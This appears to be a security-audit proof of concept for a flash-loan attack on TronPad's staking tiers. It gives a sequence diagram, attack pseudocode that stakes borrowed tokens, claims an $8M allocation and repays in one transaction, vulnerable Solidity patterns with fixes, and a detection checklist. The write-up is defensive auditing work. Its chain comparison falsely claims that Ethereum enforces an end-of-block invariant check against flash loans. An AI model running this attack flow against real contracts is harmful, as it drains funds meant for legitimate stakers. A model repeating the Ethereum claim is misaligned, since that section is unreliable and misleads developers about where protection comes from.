# Transaction Flow Diagram - Flash Loan Tier Manipulation Attack

## Sequence Diagram (ASCII)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          SINGLE TRON BLOCK (ATOMIC)                          │
└─────────────────────────────────────────────────────────────────────────────┘

PARTICIPANT: Attacker, JustSwap, StakingContract, AllocationContract, Token

    ATTACKER                JUSTSWAP            STAKING            ALLOCATION
        │                       │                  │                    │
        │  executeAttack()      │                  │                    │
        ├──────────────────────→│                  │                    │
        │                       │                  │                    │
        │  .swap(2M TRONPAD)    │                  │                    │
        │                       │                  │                    │
        │  [1] Transfer 2M      │                  │                    │
        │  TRONPAD to attacker  │                  │                    │
        │←──────────────────────┤                  │                    │
        │  Balance: +2,000,000  │                  │                    │
        │                       │                  │                    │
        │  [2] Call callback    │                  │                    │
        │  uniswapV2Call()      │                  │                    │
        │←──────────────────────┤                  │                    │
        │                       │                  │                    │
        ├─────────────────────────────────────────→│                    │
        │                    stake(2M)             │                    │
        │                                          │                    │
        │                       [3] STATE UPDATE   │                    │
        │                       balance[attacker]  │                    │
        │                       += 2,000,000       │                    │
        │                                          │                    │
        │                       [4] TIER CALC      │                    │
        │                       2M >= 50k?         │                    │
        │                       YES → TIER_2 ✓     │                    │
        │                                          │                    │
        │                       tier[attacker]     │                    │
        │                       = GUARANTEED_T2    │                    │
        │                                          │                    │
        │                       ❌ NO SNAPSHOT      │                    │
        │                       ❌ NO TIMELOCK      │                    │
        │←─────────────────────────────────────────┤                    │
        │                   Return: SUCCESS        │                    │
        │                                          │                    │
        ├──────────────────────────────────────────────────────────────→│
        │                    claimAllocation(projectId)                 │
        │                                                               │
        │  [5] CHECK TIER                                              │
        │  getTierOf(attacker)                                         │
        │  = GUARANTEED_T2 ✓ (just set in step 4!)                    │
        │                                          │                    │
        │  [6] CHECK ALLOCATION                                        │
        │  allocationByTier[TIER_2] = $8M          │                    │
        │  allocationPool >= $8M? YES              │                    │
        │                                          │                    │
        │  ❌ NO SNAPSHOT CHECK                     │                    │
        │  ❌ NO COOLDOWN CHECK                     │                    │
        │  ❌ NO RE-VERIFICATION OF BALANCE         │                    │
        │                                          │                    │
        │  [7] STATE UPDATE                        │                    │
        │  allocationPool -= $8M                   │                    │
        │  hasClaimed[attacker] = true             │                    │
        │                                          │                    │
        │  [8] TRANSFER ALLOCATION                 │                    │
        │  Transfer $8M tokens to attacker ✓       │                    │
        │  EXTRACTED!                              │                    │
        │←──────────────────────────────────────────────────────────────┤
        │         Return: $8,000,000 (CLAIMED)                         │
        │                                                               │
        ├─────────────────────────────────────────→│                    │
        │  unstake(2M)                             │                    │
        │                                          │                    │
        │  [9] STATE UPDATE                        │                    │
        │  balance[attacker] -= 2,000,000          │                    │
        │  balance[attacker] = 0                   │                    │
        │                                          │                    │
        │  [10] TIER REMOVAL                       │                    │
        │  getTierByBalance(0)                     │                    │
        │  tier[attacker] = NONE                   │                    │
        │                                          │                    │
        │  ❌ NO REVERSAL OF ALLOCATION!            │                    │
        │  (Allocation already transferred)        │                    │
        │←─────────────────────────────────────────┤                    │
        │  Return: SUCCESS                         │                    │
        │                                          │                    │
        ├──────────────────────────────────────────────────────────────→│
        │  Repay Flash Loan                        │                    │
        │                                          │                    │
        │  [11] REPAYMENT                          │                    │
        │  Transfer 2,006,000 TRONPAD              │                    │
        │  (2M + 0.3% fee)                         │                    │
        │  to JustSwap pair                        │                    │
        │←──────────────────────────────────────────────────────────────┤
        │  Callback verified: Balance sufficient   │                    │
        │                                          │                    │
        │  [12] FINALIZE                           │                    │
        │  Return true from callback               │                    │
        │  Transaction commits ✓                   │                    │
        │←──────────────────────────────────────────┤                    │
        │                                          │                    │

┌─────────────────────────────────────────────────────────────────────────────┐
│                      BLOCK N COMMITTED SUCCESSFULLY                          │
└─────────────────────────────────────────────────────────────────────────────┘

FINAL STATE:
  Attacker wallet:
    ├─ Allocation: +$8,000,000 USD ✓
    ├─ TRONPAD: 0 (repaid)
    ├─ Transaction cost: ~$25
    └─ Net profit: $7,999,975

  TronPad contracts:
    ├─ AllocationPool: $8M → $0 (DRAINED)
    ├─ attacker_balance: $8M (allocated)
    ├─ attacker_tier: NONE (back to original)
    └─ Legitimate stakers: Cannot claim (pool empty)
```

## State Transition Table

| Step | Operation | Attacker Balance | Attacker Tier | Pool Status | Allocation Claim |
|------|-----------|------------------|---------------|------------|-----------------|
| **0** | Initial | 0 TRONPAD | NONE | $8M available | ❌ Not eligible |
| **1** | Flash Transfer | 2M TRONPAD | NONE | $8M | ❌ (tier check fail) |
| **2** | Stake | 2M TRONPAD | ✓ GUARANTEED_T2 | $8M | ✓ Now eligible |
| **3** | Claim Allocation | 2M TRONPAD | GUARANTEED_T2 | $0 (drained) | ✓ $8M transferred |
| **4** | Unstake | 0 TRONPAD | NONE | $0 | ✓ $8M already in wallet |
| **5** | Repay | 0 TRONPAD | NONE | $0 | ✓ $8M kept (no reversal) |

**Key Observation:** Between Step 1→2, tier went from ❌ ineligible to ✓ eligible. Between Step 4→5, tier went from ✓ eligible back to ❌ ineligible, BUT the allocation was already transferred and is NOT reversed.

## Control Flow (Python-like pseudocode)

```python
# BLOCK N EXECUTION (ATOMIC)

def execute_attack(project_id, flash_amount=2_000_000):
    """Main attack entry point"""
    
    # Step 1: Flash Loan Request
    # ─────────────────────────
    justswap.swap(
        token=TRONPAD,
        amount=flash_amount,
        receiver=attack_contract,
        callback=on_flash_swap
    )
    
    # Now in callback: [attack_contract has flash_amount TRONPAD]
    
    return calculate_profit()


def on_flash_swap(sender, amount, data):
    """JustSwap callback - executes within flash loan transaction"""
    
    project_id = decode(data)
    
    # PHASE 1: Tier Elevation
    # ──────────────────────
    
    # Step 2: Token approved (implicit via transferFrom)
    staking.approve(attack_contract, amount)
    
    # Step 3: STAKE (THE VULNERABILITY TRIGGER)
    staking.stake(amount)
    
    # At this point:
    # - attack_contract.balance = amount (from flash transfer)
    # - staking.getTierOf(attack_contract) = GUARANTEED_T2 ✓
    # ❌ No snapshot was taken of tier assignment
    # ❌ No timelock was enforced
    # ❌ Tier is based on CURRENT balance, not historical
    
    
    # PHASE 2: Allocation Extraction
    # ──────────────────────────────
    
    # Step 4: CLAIM ALLOCATION
    allocation = allocation_contract.claimAllocation(project_id)
    
    # allocationContract.claimAllocation() does:
    #   tier = staking.getTierOf(caller)
    #   require(tier >= GUARANTEED_T2)  ✓ Passes (just set)
    #   allocation_amount = allocationByTier[TIER_2]  # $8M
    #   require(pool >= allocation_amount)  ✓ Passes
    #   pool -= allocation_amount  # $8M → $0
    #   token.transfer(caller, allocation_amount)  ✓ EXTRACTED
    #   return allocation_amount
    
    # At this point:
    # - attack_contract has $8M allocation ✓
    # - allocationPool[project_id] = 0 (DRAINED)
    # - Legitimate stakers cannot claim
    
    
    # PHASE 3: Evidence Removal & Repayment
    # ──────────────────────────────────────
    
    # Step 5: UNSTAKE (Hide the attack)
    staking.unstake(amount)
    
    # At this point:
    # - attack_contract.balance = 0
    # - staking.getTierOf(attack_contract) = NONE
    # ❌ BUT: Allocation is already transferred!
    #    There is no reversal mechanism
    
    
    # Step 6: REPAY FLASH LOAN
    fee = amount * 0.003  # 0.3%
    repay_amount = amount + fee
    
    tronpad_token.transfer(justswap_pair, repay_amount)
    
    # At this point:
    # - Flash loan is repaid with fee
    # - Callback returns successfully
    # - Transaction commits
    
    return allocation  # Attacker keeps this


def calculate_profit():
    """Profit analysis"""
    
    allocation_received = 8_000_000  # USD
    flash_fee = 2_000_000 * 0.003    # 0.3% = 6,000 TRONPAD
    flash_fee_usd = 6_000 * 0.003    # $18
    transaction_cost = 100 * 0.075   # ~$7.50 (100 TRX)
    
    total_cost = flash_fee_usd + transaction_cost  # ~$25.50
    
    net_profit = allocation_received - total_cost
    # net_profit ≈ $7,999,974.50
    
    profit_margin = (net_profit / allocation_received) * 100
    # profit_margin ≈ 99.999%
    
    return {
        'allocation': allocation_received,
        'costs': total_cost,
        'profit': net_profit,
        'margin': profit_margin
    }
```

## Why This Works on TRON

### TVM Single-Threaded Execution

```
TRON Virtual Machine (TVM):
  Block execution:
    ├─ Call 1: execute_attack()
    │  └─ Call 2: justswap.swap()
    │     └─ Call 3: on_flash_swap() [CALLBACK]
    │        ├─ Call 4: stake()
    │        │  └─ State writes: balance+=2M, tier=TIER_2
    │        ├─ Call 5: claimAllocation()
    │        │  └─ State writes: pool-=8M, transfer 8M
    │        ├─ Call 6: unstake()
    │        │  └─ State writes: balance-=2M, tier=NONE
    │        └─ Call 7: repay()
    │           └─ State writes: transfer 2M fee
    │
    └─ All calls sequential in ONE block
       All reads see INTERMEDIATE state from prior calls ✓

KEY INSIGHT:
  - TVM executes sequentially within a block
  - Later calls see state written by earlier calls
  - No "block snapshot" mechanism by default
  - This is DIFFERENT from Ethereum's approach
```

### Comparison: Why Ethereum Resists This

```
Ethereum FlashLoan Protection:

1. Transfers happen in same tx ✓
2. BUT: State is accumulated
3. END-OF-BLOCK INVARIANT CHECK:
   
   require(pool_end >= pool_start)
   require(token_balance_end >= token_balance_start)
   
   This catches flash loans because:
   - pool_end is 0 (was drained)
   - pool_start was 8M
   - 0 < 8M → FAILS
   
   Blocks execution ✗


TRON Lacks This:
  - No built-in end-of-block invariant
  - Tier is live, not snapshotted
  - Allocation contract trusts staking contract state
  - Single-threaded execution means later calls SEE changes
  
  This is a PROTOCOL DESIGN DIFFERENCE, not a security bug
  in TRON VM itself. It's a SMART CONTRACT vulnerability.
```

## Vulnerable Code Patterns (Marked with ❌)

```solidity
// PATTERN 1: Live Balance Tier Assignment (❌ VULNERABLE)
function stake(uint256 amount) external {
    balance[msg.sender] += amount;
    
    // ❌ Tier based on current balance, not historical
    tier[msg.sender] = calculateTier(balance[msg.sender]);
    
    // FIX: Use snapshot
    // tierSnapshot[msg.sender][block.number] = calculateTier(amount);
    // tier[msg.sender] = calculateTier(snapshotBalance);
}


// PATTERN 2: Immediate Claim After Stake (❌ VULNERABLE)
function claimAllocation(uint256 projectId) external {
    
    // ❌ Can claim immediately after staking
    uint tier = staking.getTierOf(msg.sender);
    
    // No cooldown check
    allocation = allocationByTier[projectId][tier];
    pool -= allocation;
    token.transfer(msg.sender, allocation);
    
    // FIX: Add cooldown
    // require(block.number >= stakeBlock[msg.sender] + 256);
}


// PATTERN 3: No Snapshot Verification (❌ VULNERABLE)
function claimAllocation(uint256 projectId) external {
    
    // ❌ Only checks current tier, not historical
    require(staking.getTierOf(msg.sender) >= TIER_2);
    
    // No balance re-check
    allocation = allocationByTier[projectId][TIER_2];
    
    // FIX: Verify balance at claim time
    // require(staking.getBalanceAtBlock(msg.sender, block.number) >= TIER_2_MIN);
}


// PATTERN 4: No Reversal on Unstake (❌ VULNERABLE)
function unstake(uint256 amount) external {
    balance[msg.sender] -= amount;
    token.transfer(msg.sender, amount);
    
    // ❌ No reversal of claimed allocations
    // allocations remain transferred
    
    // FIX: Revert claims if tier drops
    // if (newTier < oldTier) {
    //   require(!hasClaimed[msg.sender], "Tier changed after claim");
    // }
}
```

## Attack Detection Checklist

```
Real-time Monitoring:
  ☐ Detected: Stake in same block as claim (block_n == block_n)
  ☐ Detected: Massive allocation claim from low historical stake
  ☐ Detected: Allocation pool drains from single transaction
  ☐ Detected: Unstake immediately after claim
  ☐ Detected: Allocation amount > 10× expected per tier
  
Post-Attack Forensics:
  ☐ Check: txHash for CallStack with stake → claim → unstake
  ☐ Check: Historical tier snapshot (none exists → vulnerable)
  ☐ Check: AllocationPool before/after
  ☐ Check: Attacker's previous stake history (likely none)
  ☐ Check: Token flow from JustSwap → Attacker → Back to JustSwap
```

---

**Generated:** 2026-08-28  
**For:** TronPad Security Audit - Flash Loan Tier Manipulation PoC
